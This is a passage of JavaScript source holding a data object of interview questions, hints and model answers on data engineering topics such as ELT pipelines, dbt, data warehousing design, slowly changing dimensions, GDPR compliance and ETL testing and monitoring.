      { q:"What is the modern data stack and how do its components fit together?", hint:"Ingestion (Fivetran, Airbyte) -> Storage (Snowflake, BigQuery, Databricks) -> Transformation (dbt) -> Orchestration (Airflow, Prefect) -> BI (Looker, Tableau, Metabase). ELT replaces ETL. Semantic layer. Data catalogue.", answer:`The modern data stack (MDS) is an ELT-based architecture that leverages cloud-native tools designed for scalability and analyst self-service. Ingestion layer: managed connectors (Fivetran, Airbyte, Stitch) extract data from source systems (SaaS apps like Salesforce, databases, APIs) and load it raw into the cloud warehouse with minimal transformation - the ELT model. Hundreds of pre-built connectors eliminate custom ingestion code. Cloud data warehouse / lakehouse: the central storage and compute layer. Snowflake and BigQuery separate storage from compute, enabling near-infinite scalability. Databricks adds a lakehouse paradigm - open table formats (Delta Lake) support both batch analytics and ML workloads on the same data. Raw data from ingestion is stored here without modification. Transformation layer: dbt (data build tool) transforms raw data into curated analytical models using SQL and software engineering practices (version control, testing, documentation). dbt runs inside the warehouse - transformations are SQL executed by the warehouse engine, not a separate ETL tool. Orchestration: Apache Airflow, Prefect, or Dagster schedule and monitor data pipelines - triggering ingestion jobs, dbt runs, and downstream processes in dependency order. Business intelligence: Looker (defines business logic in LookML semantic layer), Tableau, or Metabase connect to the warehouse for reporting and dashboards. The semantic layer (Looker, dbt Metrics, Cube.js) defines business metrics once (e.g., 'active user = user with login in last 30 days') so all BI tools use consistent definitions.` },
      { q:"How do you design a scalable and maintainable ELT pipeline?", hint:"Source-aligned staging -> integration/hub layer -> mart layer (Kimball). Idempotent loads. Incremental vs full refresh. Watermark-based CDC. Modular dbt models. Test data quality at each layer. Document in data catalogue.", answer:`A well-structured ELT pipeline separates concerns across layers, making each layer independently testable and maintainable. Layer architecture (dbt-style): Staging layer: one-to-one with source tables. Rename columns to consistent naming conventions, cast data types, and do minimal transformations - no joins. Staging models are replaceable and reflect source structure. Intermediate layer: join and aggregate staging models - entity resolution, deduplication, business rules. Denormalise where appropriate for downstream performance. Mart layer: analytics-ready dimensional models (fact tables and dimension tables). Named for the business domain (mart_sales, mart_marketing). Direct source for BI tools. Idempotency: every pipeline run should produce the same result when run multiple times - essential for reliable reruns after failures. Achieve by replacing entire partitions rather than appending (INSERT OVERWRITE), or by using MERGE/UPSERT with a natural key. Incremental loading: for large tables, load only new or changed records rather than full refresh. Watermark-based: track the maximum updated_at timestamp processed; on the next run, load records with updated_at > watermark. Change Data Capture (CDC): capture row-level changes from source databases in real-time using log-based CDC (Debezium reads the database transaction log) - avoids full table scans. Data quality tests at each layer: dbt tests (not_null, unique, accepted_values, referential_integrity) run after each model. Failing tests block downstream models. Great Expectations or dbt Expectations for custom statistical tests (row count within expected range, distribution checks).` },
      { q:"What is data lineage and why is it important in data engineering?", hint:"Data lineage: tracks data from source to consumption. Column-level lineage shows specific field transformations. Use cases: impact analysis (what breaks if source changes), root cause debugging (where did bad data come from), compliance/auditing (GDPR right to erasure). Tools: dbt, OpenLineage, Marquez, DataHub.", answer:`Data lineage documents the journey of data from its origin through every transformation to its final consumption - answering 'where did this data come from and how was it transformed?' Table-level lineage tracks which source tables feed which downstream tables. Column-level lineage tracks the transformation of specific fields through the pipeline - knowing that the revenue column in the sales_mart table is derived from order_items.unit_price Ã— order_items.quantity - order_items.discount enables precise impact analysis. Use cases: Impact analysis: when a source system changes a column name or data type, lineage identifies every downstream model, report, and dashboard affected - enabling proactive communication and coordinated updates rather than discovering breakage in production. Root cause debugging: when a dashboard shows unexpected numbers, lineage allows traversing backwards through transformations to identify where incorrect values were introduced. GDPR compliance: when a customer exercises their right to erasure, you must delete or anonymise their data across all systems. Lineage identifies every table and column containing their data. Compliance auditing: proving to regulators that sensitive data is only used for stated purposes requires knowing where it flows. Data discovery: analysts can follow lineage forward from a source table to understand what analytical models use it and what business questions they answer. Tools: dbt documents table-level lineage automatically from model references. Column-level lineage requires additional tooling: SQLGlot parses SQL to extract column-level dependencies; OpenLineage (open standard) emits lineage events from Airflow, Spark, and dbt to backends like Marquez or DataHub. DataHub and Apache Atlas provide enterprise data lineage and catalogue platforms.` },
      { q:"How do you handle schema evolution in production data pipelines?", hint:"Schema-on-read vs schema-on-write. Backward-compatible changes: add nullable column. Breaking changes: column rename, type change. Strategies: schema registry (Confluent), contract testing, versioned schemas. Forward compatibility. Automated schema drift detection.", answer:`Schema evolution - changes to the structure of source data - is one of the most common causes of pipeline failures and data quality incidents. Types of changes: Backward-compatible (non-breaking): adding a new nullable column - downstream consumers can ignore the new column without breaking. Renaming a column - breaking for any consumer using the old name. Changing a data type (e.g., string to integer) - potentially breaking (data that was valid in the old type may be invalid in the new). Dropping a column - breaking. Changing nullability (adding NOT NULL constraint to previously nullable column). Strategies for managing schema evolution: Schema Registry: for event-driven pipelines (Kafka), Confluent Schema Registry enforces schema compatibility rules (BACKWARD, FORWARD, FULL compatibility) for Avro, Protobuf, or JSON Schema. Producers cannot publish schemas that break registered compatibility rules. Prevents silent breaking changes. Data contracts: formal agreements between data producers and consumers defining the schema, data quality expectations, and SLAs. Producers commit to providing the schema; consumers commit to handling it. Tools: Soda, Great Expectations, dbt contracts. Schema drift detection: automated monitoring that alerts when source schema changes - CloudWatch, dbt source freshness and schema checks, Fivetran's schema change notifications. Migration strategy for breaking changes: rather than changing a column in place, add a new column with the new name/type, populate it, notify downstream consumers to migrate, then deprecate the old column. Version schemas explicitly in namespace or table name (events_v1, events_v2) during migration periods.` },
      { q:"What is dbt (data build tool) and what problems does it solve?", hint:"dbt: SQL-based transformation framework with software engineering practices: version control (git), testing, documentation, modularity (ref/source macros), environments (dev/staging/prod). Runs SQL inside the warehouse. Models, tests, snapshots, seeds, macros.", answer:`dbt (data build tool) brings software engineering best practices to SQL-based data transformations. Before dbt, data transformations were often: unversioned SQL scripts running in scheduled jobs, with no testing, no documentation, and no modularity - a fragile and opaque system. Core concepts: Models: SQL SELECT statements saved as .sql files. Each model becomes a table or view in the warehouse. dbt compiles and runs them in dependency order. ref() macro: {{ ref('stg_orders') }} references another model - dbt builds the DAG automatically from ref() calls and runs models in the correct order. source() macro: {{ source('raw', 'orders') }} references a source table, enabling source freshness checks and documentation. Testing: schema.yml files define tests at the column level: unique, not_null, accepted_values (status must be 'active', 'inactive', or 'deleted'), relationships (every order must have a corresponding customer). Tests run after each model build and fail loudly if data quality degrades. Documentation: descriptions in schema.yml and doc blocks are compiled into a browsable data catalogue with column-level documentation and the DAG visualisation - analysts can understand what a table contains and where it came from. Macros: Jinja templating enables reusable SQL logic - a deduplicate macro can be called across multiple models rather than copying deduplication logic. Snapshots: dbt snapshot implements Type 2 SCD (Slowly Changing Dimension) - tracking historical state of a mutable source table. Environments: dbt dev profiles run against a developer's personal schema; CI runs against a staging schema; production runs against the production schema - the same code, different targets.` },
      { q:"What is the Lambda architecture vs the Kappa architecture?", hint:"Lambda: batch layer (high latency, accurate) + speed layer (low latency, approximate) + serving layer merges both. Complex dual codebase. Kappa: stream-only, reprocess by replaying the event log. Simpler but requires mature streaming infrastructure. Kappa preferred when streaming is sufficient.", answer:`Both architectures address the challenge of building systems that provide both historical batch analytics and real-time results. Lambda Architecture (Nathan Marz, 2011): three layers. Batch layer: processes all historical data periodically (e.g., nightly), producing highly accurate but high-latency batch views. Implemented with Spark, Hive, or similar. Speed layer: processes real-time data streams (Kafka + Spark Streaming/Flink) to produce low-latency but potentially approximate views of recent data. Serving layer: merges results from batch and speed layers to answer queries - recent data from the speed layer, historical data from the batch layer. Problems with Lambda: maintaining two separate codebases (batch and streaming) implementing the same business logic is expensive. They inevitably diverge, producing inconsistent results. Debugging discrepancies between batch and streaming results is complex. Kappa Architecture (Jay Kreps, 2014): eliminate the batch layer entirely. Use a durable, replayable event log (Apache Kafka) as the source of truth. The single streaming pipeline produces both real-time results and can be replayed from the beginning of the log to reprocess history when business logic changes. The serving layer stores results from the single pipeline. Benefits: one codebase, one technology, consistent logic. Kappa requires: a durable event log with sufficient retention (Kafka can retain indefinitely), a streaming framework capable of processing historical data at high throughput (Apache Flink, Spark Structured Streaming), and a serving layer that handles both streaming writes and analytical reads efficiently. Modern preference: Kappa is preferred when streaming infrastructure is mature enough - it eliminates dual-maintenance complexity. Lambda may still be appropriate when batch processing has fundamentally different access patterns or cost profiles.` },
      { q:"How do you ensure data quality and freshness in production data pipelines?", hint:"Data quality dimensions: completeness, accuracy, consistency, timeliness, uniqueness. dbt tests: not_null, unique, accepted_values. Great Expectations for statistical assertions. Freshness checks: dbt source freshness, Airflow SLAs. Anomaly detection: Monte Carlo, Bigeye. Alerting and on-call.", answer:`Data quality is a multi-dimensional concern that requires monitoring at every layer of the pipeline. Quality dimensions: Completeness - are all expected records present? (row count within expected range, no unexpected nulls). Accuracy - does the data correctly reflect the source? Consistency - does data in different tables agree? (customer count in dim_customers equals customer count in fact_orders). Timeliness/Freshness - how current is the data? Uniqueness - no duplicate records on keys that should be unique. Implementation: dbt schema tests run after each model: not_null on critical columns, unique on primary keys, accepted_values for status fields, relationships for referential integrity (every order's customer_id exists in dim_customers). These are the minimum tests - every model should have them. dbt source freshness: configured in sources.yml with a warn_after and error_after threshold - if the source table has not been updated within the expected window, dbt alerts. Great Expectations: statistical data quality assertions beyond what dbt's built-in tests support - 'column values should have a mean between 45 and 55', 'row count should be between 10,000 and 50,000', 'no column should have more than 5% null values'. Data observability platforms (Monte Carlo, Acceldata, Bigeye) apply ML-based anomaly detection - learning the normal distribution of row counts, null rates, and value distributions and alerting when they deviate unexpectedly. Alerting: data quality failures should trigger PagerDuty alerts with the same urgency as infrastructure alerts - stale or incorrect data reaching business users is a production incident. Document data freshness SLAs per table and enforce them.` },
    ],
    'data warehousing': [
      { q:"What is a data warehouse and how does it differ from a data lake and a data lakehouse?", hint:"Data warehouse: structured, schema-on-write, optimised for SQL analytics, business users. Data lake: raw, any format, schema-on-read, cheap storage, ML/exploration. Lakehouse: combines both - open table formats (Delta, Iceberg, Hudi) on object storage with ACID and SQL support.", answer:`These three storage architectures differ in structure, flexibility, and use case. Data Warehouse: stores structured, processed data organised into relational schemas (fact and dimension tables). Schema-on-write - data is transformed and validated before loading. Optimised for SQL analytical queries with columnar storage, compression, and query optimisation. Business users and analysts query it directly. Examples: Snowflake, Google BigQuery, Amazon Redshift, Azure Synapse. Best for: structured reporting, dashboards, self-service analytics by SQL-proficient business users. Data Lake: stores raw data in its native format (JSON, CSV, Parquet, images, video, logs) on cheap object storage (S3, ADLS, GCS). Schema-on-read - structure is applied when reading, not writing. Any data type, any size. Requires technical users (data engineers, data scientists) and specific tooling (Spark, Hive) to read the data. Best for: storing raw event data, ML training datasets, data exploration, cheap long-term archival. Problems: data swamps (data without governance becomes unusable), no ACID transactions (inconsistent reads during updates), slow SQL performance. Data Lakehouse: combines the low-cost raw storage of a data lake with the reliability and SQL performance of a data warehouse. Open table formats (Delta Lake on Databricks, Apache Iceberg on Snowflake/AWS, Apache Hudi on AWS EMR) add ACID transactions, schema enforcement, time-travel (query historical versions), and Z-ordering (data clustering for query performance) on top of object storage files. The same data serves both SQL analytics and ML workloads. Examples: Databricks Lakehouse, Snowflake with Iceberg, Apache Iceberg on S3 with Athena or Trino.` },
      { q:"Explain Kimball vs Inmon approaches to data warehouse design.", hint:"Kimball (dimensional): business-process-centric, star schema, bottom-up (build marts first). Query-friendly, faster delivery. Inmon (EDW): enterprise-wide integrated, normalised 3NF, top-down. Single source of truth, complex queries. Inmon builds normalised EDW first, then data marts from it.", answer:`The two foundational DW design philosophies take opposite approaches to the same problem - organising enterprise data for analytics. Kimball (dimensional modelling, Ralph Kimball): bottom-up approach. Identify a business process (orders, inventory, customer service), define its grain (one row = one order line), build a star schema (fact table surrounded by dimension tables), and deliver it as a data mart. Repeat for other business processes. The enterprise warehouse is a collection of conformed, integrated data marts. Schema style: denormalised star schema - fact table with many dimension keys, dimension tables denormalised for query simplicity. Query performance: excellent (single join from fact to each dimension, no complex chain joins). Delivery: faster to deliver value because you build one process at a time. Consistency: conformed dimensions (a single dim_customer used by all fact tables) ensures consistency across marts. Best for: organisations needing fast time-to-value, business-user-facing reporting. Inmon (Corporate Information Factory, Bill Inmon): top-down approach. Design a normalised (3NF) enterprise data warehouse (EDW) first - all enterprise data in a single integrated, subject-oriented model. Then build dimensional data marts from the EDW for specific analytical use cases. Schema style: highly normalised 3NF - eliminates redundancy, ensures referential integrity. Query performance: poor for analytics without mart layer (many joins required). Implementation: slow and expensive upfront - the full EDW must be designed before delivering analytical value. Best for: organisations prioritising a single, authoritative source of truth and complex cross-functional queries. Modern practice: most organisations use a hybrid - a staging layer with Inmon-style integration followed by Kimball-style dimensional marts for reporting.` },
      { q:"What is a star schema and a snowflake schema, and when do you use each?", hint:"Star schema: fact table + denormalised dimension tables (one join to fact). Simple queries, fast performance. Snowflake schema: normalised dimensions (dimensions join to sub-dimensions). Saves storage, harder to query. Star preferred for analytics; snowflake for large, frequently updated dimensions.", answer:`Both schemas organise data warehousing tables into fact and dimension tables but differ in how dimensions are structured. Star Schema: the fact table sits at the centre, surrounded by denormalised dimension tables. Each dimension has all attributes in one table - dim_customer has customer_id, name, city, state, country, segment, all in one table. A query joining fact_sales to dim_customer, dim_product, and dim_date requires only three joins. Advantages: simple, fast queries (fewer joins, smaller join trees); easy for business users to understand; excellent query optimiser performance (BI tools generate efficient SQL). Disadvantages: data redundancy in dimension tables (the same city/state/country combination repeated for each customer in that city). Snowflake Schema: dimension tables are normalised into multiple related tables - dim_customer -> dim_city -> dim_state -> dim_country. Advantages: eliminates redundancy (each city/state/country stored once); dimension tables are smaller and faster to update when attributes change. Disadvantages: more complex queries (more joins); slower query performance (additional joins); more difficult for business users to understand and for BI tools to auto-generate SQL. When to use: Star schema is preferred for most analytical workloads - query simplicity and performance outweigh storage savings in modern cloud warehouses where storage is cheap. Snowflake schema may be appropriate for very large dimension tables with high cardinality hierarchies (geography, product hierarchy with thousands of products) where normalisation significantly reduces storage and update complexity. In practice, most production data warehouses use star schemas for the fact-adjacent dimensions and may normalise only very large or frequently updated dimensions.` },
      { q:"How do you implement Slowly Changing Dimensions (SCDs)?", hint:"SCD Type 0: never changes. Type 1: overwrite (no history). Type 2: add new row with effective dates (full history). Type 3: add 'previous value' column (one history). Type 6 = 1+2+3 hybrid. dbt snapshot implements Type 2. Use case: customer address changes, product category reclassification.", answer:`Slowly Changing Dimensions handle the fact that dimension attributes change over time - a customer moves cities, a product changes category, an employee changes department. The handling strategy depends on whether history matters. Type 0 (Fixed): the attribute never changes - set at creation and immutable. Example: original order date. Type 1 (Overwrite): when the attribute changes, overwrite the old value. No historical record is kept. Use when: history is irrelevant or should not affect historical analysis. Example: correcting a data entry error, updating a customer's email address when you only care about the current email. Simple but loses history. Type 2 (Add new row): when an attribute changes, expire the current row and insert a new row with the updated values. Each row has effective_date (when it became active) and expiry_date (when it was superseded), and an is_current flag. The customer dimension has multiple rows for customers who moved - historical fact rows join to the dimension row that was current at the time of the transaction. Full history preserved. Most important SCD type. dbt snapshot implements Type 2 automatically using a unique_key and updated_at strategy. Use when: you need to analyse historical transactions with the dimension values that were correct at the time. Example: sales by customer segment where customers can change segments. Type 3 (Add column): add a 'previous_value' column alongside the current value. Only one level of history - 'current_city' and 'previous_city'. Rarely used in practice - only handles one change. Type 6 (Hybrid 1+2+3): maintains full Type 2 history rows, adds current attribute columns to every row, and adds previous attribute columns. Allows both historical analysis (using effective dates) and current-state analysis (using current_* columns) without complex joins.` },
      { q:"How do you optimise query performance in cloud data warehouses?", hint:"Clustering/partitioning: eliminate scanning irrelevant data. Column pruning: SELECT only needed columns. Materialised views. Result cache. Statistics/query profile. Avoid SELECT *. Avoid row-by-row operations. Warehouse (compute) sizing. Window functions vs self-joins.", answer:`Cloud data warehouses (Snowflake, BigQuery, Redshift) are columnar and MPP (massively parallel processing) - optimisation levers differ from row-oriented RDBMS. Partitioning and clustering: filter on partition/cluster columns to eliminate entire partitions from scanning - the most impactful optimisation. In BigQuery, partition by event_date and filter WHERE event_date = '2024-03-15' scans only that day's partition instead of the full table. In Snowflake, CLUSTER BY (customer_id, date) creates micro-partitions optimised for those filter columns. Use EXPLAIN or query profile to verify partition/clustering elimination. Column pruning: SELECT only the columns needed - columnar storage reads columns independently, so SELECT col1, col2 FROM billion_row_table reads only two columns vs SELECT * reading all. Materialised views: pre-compute expensive aggregations and store them. Queries that match the materialised view pattern are automatically served from the pre-computed result. Automatic query rewriting in Snowflake and BigQuery. Result caching: Snowflake caches the result of identical queries - repeated identical queries return immediately. BigQuery caches results for 24 hours. Avoid cache-busting patterns (CURRENT_TIMESTAMP() in every query). Query profile analysis: in Snowflake, the Query Profile visualises the execution plan - identify which steps consume the most time (spilling to disk indicates insufficient warehouse memory, large table scans indicate missing clustering). Avoid inefficient patterns: correlated subqueries (rewrite as joins), row-by-row processing in stored procedures (rewrite as set-based SQL), and SELECT * with subsequent filtering.` },
      { q:"What is partitioning and clustering in cloud data warehouses?", hint:"Partitioning: physically divide table into segments on a column (date, region). Queries filtered on the partition column scan only relevant partitions (partition pruning). Clustering (Snowflake) / Clustering order (BigQuery): sort data within partitions for micro-partition elimination. Reclustering cost vs benefit.", answer:`Partitioning and clustering are the two primary physical data organisation strategies for query performance in cloud data warehouses. Partitioning divides a large table into discrete physical segments based on the value of a column. Most commonly partitioned by date - each day's data is stored in its own partition. A query filtering WHERE event_date = '2024-03-15' reads only that day's partition, regardless of table size. Without partitioning, the same query scans the entire table. Partition strategies: date partitioning (most common - daily, monthly partitions), range partitioning (numeric ranges), list partitioning (specific values like region). Partitioning is effective when queries consistently filter on the partition column and the partition column has low-to-moderate cardinality (days, months, regions - not user IDs). Clustering (Snowflake) organises data within partitions (micro-partitions in Snowflake's terminology) by the values of specified columns. CLUSTER BY (customer_id) sorts data so that rows with nearby customer_id values are stored in the same micro-partitions - a query filtering WHERE customer_id = 12345 scans only a few micro-partitions rather than the entire partition. Reclustering: as data is inserted, clustering degrades over time (new rows are not inserted in sorted order). Snowflake's Automatic Clustering (paid feature) maintains clustering automatically. Manual reclustering: ALTER TABLE ... RECLUSTER is expensive - evaluate whether the query performance benefit justifies the compute cost. BigQuery Clustering: similar concept - data is sorted within each partition by the cluster columns. Combined partitioning + clustering: partition by date, cluster by customer_id - optimal for queries filtering on both (most production analytical queries).` },
      { q:"How do you design a data warehouse for GDPR compliance?", hint:"Data minimisation: only store what you need. Purpose limitation: document why you store each field. Right to erasure: can you delete a user's data across all tables? Data retention policies. Pseudonymisation/anonymisation. Data catalogue with classification (PII fields). Audit logging.", answer:`GDPR compliance imposes specific requirements on data warehouse design and operations. Data minimisation: only collect and store personal data necessary for a specific, documented purpose. In the warehouse, this means not copying all source fields - only the fields needed for the stated analytical purpose. Document the purpose for each PII field in the data catalogue. Right to erasure (Article 17): when a user requests erasure, you must delete or anonymise their personal data across all systems. In a warehouse with fact tables joined to customer dimensions, this is complex - you cannot simply delete the customer row without breaking foreign key relationships in fact tables, and historical transactions may span years of data across multiple tables. Design strategies: pseudonymisation (replace PII with a non-reversible identifier in fact tables - if the customer key is a SHA-256 hash of the email rather than the actual email, erasure means deleting the mapping table entry); separate PII vault (store personal attributes in a dedicated, tightly controlled table; analytics tables use surrogate keys; erasure deletes the mapping). Data retention policies: define and enforce maximum retention periods by data category - audit logs 7 years, transaction data 5 years, marketing interaction data 2 years. Implement automated deletion or anonymisation jobs that run on schedule. Data classification in catalogue: tag every column containing PII (name, email, IP address, device ID) in the data catalogue so data engineers and analysts know which fields require special handling. Audit logging: all queries accessing PII-tagged tables should be logged with user, timestamp, and query - demonstrating that data is accessed only for stated purposes. Encryption at rest and in transit: minimum baseline for any data warehouse containing personal data.` },
    ],
    etl: [
      { q:"What is the difference between ETL and ELT, and when do you use each?", hint:"ETL: extract, transform (on separate server), load clean data into warehouse. ELT: extract, load raw into warehouse, transform inside warehouse. ETL: legacy DWH, sensitive data, complex pre-load transformations. ELT: cloud DWH (BigQuery, Snowflake), scalable compute, faster iteration.", answer:`ETL (Extract, Transform, Load) is the traditional approach: data is extracted from source systems, transformed in a separate processing environment (ETL server, Spark cluster, Talend), and then clean, structured data is loaded into the data warehouse. The transformation step outside the warehouse handles data cleansing, format conversion, business rule application, and data integration before the warehouse sees it. ELT (Extract, Load, Transform) reverses the order: raw data is extracted and loaded directly into the cloud data warehouse first, then transformed using the warehouse's own compute. The warehouse handles transformation - SQL or dbt models execute inside Snowflake, BigQuery, or Redshift. Why ELT became dominant with cloud warehouses: Cloud DWH have near-infinite elastic compute - running complex transformations inside Snowflake costs money but eliminates infrastructure management. Raw data is preserved (useful for debugging, reprocessing, and ML). Faster iteration: changing a transformation is updating a SQL model, rerunning it - not redeploying an ETL pipeline and reloading data. dbt makes ELT transformations version-controlled, tested, and documented. When ETL still makes sense: sensitive data that must be masked or pseudonymised before touching the warehouse (compliance requires raw PII never enters the analytical system). Complex pre-load transformations not expressible in SQL (image processing, ML-based entity resolution, binary parsing). Legacy on-premises warehouses (Oracle, Teradata) without the elastic compute to handle heavy transformations. Very high-volume streaming data where per-event transformations need to happen before storage. Most new analytical systems use ELT - the ETL label is often used loosely to mean any data pipeline regardless of transformation location.` },
      { q:"How do you design a fault-tolerant ETL pipeline?", hint:"Idempotency: rerunning produces same result. Checkpointing: resume from last successful step. Dead letter queue for failed records. Transactional loading (atomic swap). Retry with backoff. Alerting and monitoring. Exactly-once semantics vs at-least-once.", answer:`Fault tolerance means the pipeline produces correct results even when individual steps fail. Idempotency is the foundational requirement: running a pipeline step multiple times produces the same result as running it once. Achieve with INSERT OVERWRITE (replace entire partitions) rather than INSERT/APPEND (appending duplicates on rerun), or with MERGE/UPSERT using a natural key. Without idempotency, a retry after partial failure produces duplicate data. Checkpointing: break the pipeline into steps with persisted checkpoints between them. If step 3 fails after steps 1 and 2 succeeded, resume from step 3 rather than re-extracting and re-transforming from the source. Store checkpoint state in a metadata table (step_name, status, last_processed_id, timestamp). Atomic loading (swap): rather than writing directly to the production table (which leaves it in a partially updated state if the load fails mid-way), write to a staging table, validate the results, then atomically swap: RENAME TABLE prod -> backup; RENAME TABLE staging -> prod. Production users never see partial data. Dead letter queue: records that fail parsing or transformation are written to a dead letter table rather than aborting the entire pipeline. The pipeline continues processing valid records; engineers investigate and reprocess failed records separately. Retry logic: transient failures (network timeouts, source system unavailability) should retry with exponential backoff and jitter - retry after 1s, 2s, 4s, 8s... up to a maximum. Permanent failures (malformed data, schema mismatch) should not retry - send to dead letter queue immediately. Monitoring: track row counts at each stage (extracted rows = loaded rows ± expected transformations), processing latency, and error rates. Alert on deviations.` },
      { q:"How do you handle data quality issues at the extraction stage?", hint:"Schema validation on ingest: reject rows failing schema. Type coercion with logging. NULL handling strategy. Duplicate detection at source. Row count reconciliation (source count vs extracted count). Incremental extraction: missed records from late-arriving data.", answer:`Extraction is the first opportunity to catch data quality issues - and the cheapest place to handle them because no downstream processing has occurred. Schema validation: before processing, validate that the source data matches the expected schema. New columns in the source are acceptable (log and ignore). Missing expected columns are a blocking error - the pipeline should halt rather than produce silently incorrect results. Type mismatches (a column that should be numeric contains text) require a decision: reject the row and send to dead letter queue, coerce the value with a default (NULL), or escalate to the source team. Null handling strategy: define explicitly for each column - is null valid? What does null mean (unknown vs not applicable vs not yet available)? Document in the pipeline configuration. Duplicate detection: if the source system can produce duplicate records (message queues delivering at-least-once, CDC systems with retransmission), implement deduplication at extraction. Use a deduplication key (event_id, record_id + updated_at) and deduplicate before loading into staging. Row count reconciliation: after extraction, query the source for the expected row count (SELECT COUNT(*) WHERE updated_at > last_run) and compare with the extracted count. A mismatch indicates missed records (late-arriving data updated after the extraction window closed) or duplicate records. Late-arriving data is a common issue with event-driven sources - events generated at time T may not arrive until T+hours. Handle by using a lookback window (always re-extract the last 24-48 hours) and using UPSERT semantics to handle updates without duplication.` },
      { q:"What are common transformation patterns in ETL/ELT pipelines?", hint:"Cleansing: normalise text, handle nulls, trim whitespace. Deduplication: window functions (ROW_NUMBER). Type casting. Standardisation: date formats, phone number formats, currency. Enrichment: lookups, joins to reference data. Aggregation. Pivoting/unpivoting. Derived columns.", answer:`Transformations convert raw source data into analytics-ready form. Cleansing: standardise text (TRIM whitespace, UPPER/LOWER case normalisation, remove control characters), handle nulls (COALESCE(col, 'Unknown') or NULL-safe comparisons), normalise encoding (UTF-8), and correct known data entry errors via lookup tables. Deduplication: sources frequently produce duplicate records. Window function pattern: ROW_NUMBER() OVER (PARTITION BY natural_key ORDER BY updated_at DESC) as rn, then filter WHERE rn = 1 to keep only the most recent version of each record. Works well in SQL-based ELT inside the warehouse. Type casting: source systems often store everything as strings (especially CSV/JSON sources). Cast explicitly: CAST(revenue_str AS DECIMAL(18,2)), CAST(event_date_str AS DATE). Standardisation: date formats from different regions (MM/DD/YYYY vs DD/MM/YYYY), phone number formats (+1-555-0100 vs 5550100 vs 001 555 0100), currency codes (USD vs US Dollar vs $). Define canonical formats and normalise everything to them. Enrichment: join to reference/lookup tables to add attributes - joining IP address to a geolocation table adds country, city, latitude, longitude. Joining product_id to a product dimension adds category and brand. Aggregation: roll up row-level transactions into period summaries - daily revenue by product, weekly active users. Often done in the mart layer. Pivoting: converting rows to columns (PIVOT) or columns to rows (UNPIVOT/MELT). Normalising: converting nested JSON structures (arrays of objects) into relational rows using LATERAL FLATTEN (Snowflake) or UNNEST (BigQuery). Derived columns: compute new fields from existing ones - age from birthdate, BMI from height/weight, full_name from first_name + ' ' + last_name.` },
      { q:"How do you implement incremental loading strategies?", hint:"Full refresh vs incremental: full is simpler, incremental is necessary for large tables. Watermark-based: MAX(updated_at) from last run. CDC (Change Data Capture): log-based (Debezium), trigger-based. Append-only (event tables). Merge/upsert for updates. Late-arriving data handling.", answer:`Full refresh (truncate and reload) is the simplest strategy - delete all data and reload from scratch on each run. Simple to implement, always correct, handles deletions automatically. Only feasible for small-to-medium tables (under a few million rows) where the source query is fast. For large tables, full refresh becomes too slow and expensive. Watermark-based incremental: track the last processed timestamp (stored in a metadata/state table). On each run, extract only records where updated_at > last_watermark. After successful load, update the watermark to the current max processed timestamp. Requires: the source table has a reliable updated_at timestamp that is set on both inserts and updates; the source system does not update records without updating the timestamp. Loading strategy: UPSERT/MERGE (INSERT new records, UPDATE existing records by primary key) to handle both inserts and updates correctly. Append-only (event/log tables): if the source only ever appends new records and never updates (event streams, log tables, audit tables), extract records WHERE created_at > last_watermark and append. No MERGE needed - row count grows monotonically. CDC (Change Data Capture): reads the database transaction log (binary log in MySQL, WAL in PostgreSQL) to capture every row-level INSERT, UPDATE, and DELETE event. Debezium is the standard open-source CDC tool, publishing events to Kafka. Benefits: captures deletions (not possible with timestamp watermarks), minimal source database impact (log reading vs full table scans), near-real-time. Late-arriving data: events may arrive hours or days after they occurred (mobile app events while offline). Handle by reprocessing a lookback window (last 3 days) on every run and using UPSERT semantics to handle updates without duplication.` },
      { q:"How do you test an ETL/ELT pipeline?", hint:"Unit tests: test transformation logic in isolation (SQL unit tests, pytest for Python transforms). Integration tests: test end-to-end with real source data sample. Data quality tests: row counts, nulls, uniqueness (dbt tests, Great Expectations). Regression tests: output matches known-good baseline. Contract tests: source schema matches expectations.", answer:`ETL pipeline testing has multiple layers, each catching different types of failures. Unit tests test individual transformation functions in isolation. For Python transformations: use pytest to test each function with synthetic input data and assert the expected output. For SQL transformations in dbt: dbt's unit testing feature (dbt 1.8+) allows specifying input fixtures and expected output for a single model - test that the deduplication logic returns exactly one row per key. Integration tests: run the full pipeline on a representative subset of production data (not mocked) in a staging environment. Verify that all components connect correctly, data flows end-to-end, and the final output tables are populated correctly. Data quality tests are the most important for ETL: after each pipeline run, run assertions on the output data - not just 'did the pipeline run without errors' but 'is the output data correct'. dbt tests: not_null, unique, accepted_values, relationships. Great Expectations: statistical assertions (row count within expected range, no column more than 5% null, numeric columns within expected min/max). Regression tests: save a snapshot of the correct output for a known input. When the pipeline is modified, run the regression test to verify the output still matches the snapshot. Critical for catching unintended consequence of logic changes. Contract tests: validate that the source data schema matches the pipeline's expectations before processing begins. If the source adds a new column or changes a type, the contract test fails immediately rather than allowing downstream corruption. Schema registry (for streaming pipelines) or dbt source tests (for batch) enforce source contracts. End-to-end smoke tests in production: after each scheduled pipeline run, run a lightweight check (row count > 0, max date = today) to confirm the pipeline produced output - alert immediately if the check fails.` },
      { q:"What are the key metrics and monitoring points for a production ETL pipeline?", hint:"Freshness: when was the target table last updated? Row count: expected vs actual. Duration: pipeline runtime trending (sudden increase = problem). Error rate: failed records / total records. Data quality score: % passing quality checks. SLA adherence. Lineage-based impact detection.", answer:`Production ETL monitoring answers two questions: is the pipeline running? And is the output correct? Freshness monitoring: the most fundamental check - when was the target table last successfully updated? If a table that should be updated hourly has not changed in 3 hours, alert immediately. Implement with a metadata table updated on successful completion, or with warehouse-level metadata queries (SELECT MAX(loaded_at) FROM target_table). dbt source freshness and Airflow SLA missed callbacks automate this. Row count tracking: log the count of records extracted, transformed, and loaded at each stage. Track trends over time - a 30% drop in daily rows without a business explanation indicates a pipeline issue or upstream data loss. Alert on statistically significant deviations from historical norms (Monte Carlo, Bigeye use ML-based anomaly detection for this). Pipeline duration: track runtime per pipeline run. A sudden increase in runtime (normally 10 minutes, now 2 hours) indicates a performance problem (data volume growth, missing partition filter, lock contention) that will eventually breach SLAs. Error rate: failed records / total extracted records. Track in the dead letter queue - a spike in errors indicates source data quality degradation or a parsing failure. Data quality score: percentage of records passing all quality checks (not_null, range checks, uniqueness). Alert when the score drops below a threshold. SLA adherence: track whether the pipeline completes within the agreed SLA window (data available by 6am for morning reporting). Report SLA breaches to business stakeholders. Alerting: pipeline failures and SLA breaches should page on-call via PagerDuty - stale data reaching business users is a production incident equivalent to a service outage.` },
    ],
  };

  const tech = [];
  const seenQs = new Set();
